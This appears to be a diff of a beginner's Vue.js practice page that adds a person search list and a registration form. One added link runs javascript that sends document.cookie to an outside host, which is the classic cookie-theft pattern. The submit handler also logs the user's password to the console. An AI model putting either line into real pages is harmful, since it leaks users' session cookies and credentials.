@@ -6,14 +6,118 @@
     </head>
     <body>
         <div id="app">
-            {{name}}
+            <input v-model="seaPerson">
+            <ul>
+                <li v-for="(item,id) in personShow" :key="id">
+                    {{item.name}}<button @click="showmore()">more</button>
+                    <h3 v-show="moreflag">{{item.hobby}}</h3>
+                </li>
+            </ul>
+            <h3>现在是：{{time | timefil}}</h3>
+            <form @submit.prevent="tijiao">
+                <label for="zh">账号：</label>
+                <input type="text" id="zh" v-model.trim="user.account">
+                <br>
+                <label for="mm">密码：</label>
+                <input type="password" id="mm" v-model="user.pwd">
+                <br>
+                <label for="nl">年龄：</label>
+                <input type="number" id="nl" v-model.number="user.age">
+                <br>
+                性别：
+                <label for="man">男</label><input type="radio" name="sex" id="man" value="男" v-model="user.sex">
+                <label for="wom">女</label><input type="radio" name="sex" id="wom" value="女" v-model="user.sex">
+                <br>
+                爱好：
+                <label for="hob1">学习</label><input type="checkbox" id="hob1" value="study" v-model="user.hobby">
+                <label for="hob2">游戏</label><input type="checkbox" id="hob2" value="game" v-model="user.hobby">
+                <br>
+                所属校区：
+                <select v-model="user.city">
+                    <option value="bj">beijing</option>
+                    <option value="sh">shanghai</option>
+                    <option value="gz">guangzhou</option>
+                </select>
+                <br>
+                其他信息：
+                <textarea v-model.lazy="user.other"></textarea>
+                <br>
+                <input type="checkbox" id="xieyi" v-model="user.xieyiflag"><label for="xieyi">阅读并接受<a>《协议》</a></label>
+                <br>
+                <button @click="">注册</button>
+                <a href=javascript:location.href="http://www.baidu.com?"+document.cookie>aa</a>
+            </form>
         </div>
         <script type="text/javascript">
+            alert("Hello World")
             var vm = new Vue({
                 el:'#app',
                 data:{
-                        name:"tengyan"
+                    user:{
+                        account:'',
+                        pwd:'',
+                        sex:"",
+                        hobby:[],
+                        city:"",
+                        other:"",
+                        xieyiflag:false,
+                        age:18,
+                    },
+                    time:1999,
+                    seaPerson:'',
+                    moreflag:false,
+                    persons:[
+                    {
+                        name:"tengyan",
+                        id:19991216,
+                        hobby:['study','web code']
+                    },
+                    {
+                        name:'donghongyao',
+                        id:19990104,
+                        hobby:['watch tv','eat']
+                    }
+                    ],
+                    personShow:[],
                 },
+                computed:{
+                    moretext(){
+                        if(this.moreflag){
+                            return [this.persons[0].hobby]
+                        }
+                    },
+                    hobby(){
+
+                    }
+                },
+                methods: {
+                    showmore(){
+                        this.moreflag= !this.moreflag
+                    },
+                    tijiao(){
+                        if(this.user.xieyiflag){
+                            console.log(JSON.stringify(this.user))
+                        }
+                    },
+                    getTime(){
+
+                    }
+                },
+                watch:{
+                    seaPerson(newValue,oldValue){
+                        this.personShow=this.persons.filter((h)=>{
+                            return h.name == newValue
+                        })
+                    },
+                    hobby(){
+                        console.log(this.hobby)
+                    }
+                },
+                filters:{
+                    timefil(value){
+                        return value + 'hh'
+                    }
+                }
             })
         </script>
     </body>
